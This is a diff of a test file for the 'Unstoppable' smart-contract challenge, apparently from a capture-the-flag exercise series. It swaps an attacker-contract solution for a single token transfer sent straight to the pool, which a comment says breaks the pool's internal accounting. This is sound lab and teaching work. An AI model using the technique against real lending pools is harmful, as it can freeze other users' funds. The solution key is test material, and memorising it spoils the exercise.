@@ -40,11 +40,9 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        const AttackerFactory = await ethers.getContractFactory('UnstoppableAttacker', deployer);
-        const attackerContract = await AttackerFactory.deploy(this.pool.address);
-        await this.token.connect(attacker).transfer(attackerContract.address, 1);
-        await attackerContract.connect(attacker).attack(10)
-
+        // Sending token directly and not using the pool's deposit function
+        // will break the internal accounting.
+        await this.token.connect(attacker).transfer(this.pool.address, 1);
     });
 
     after(async function () {
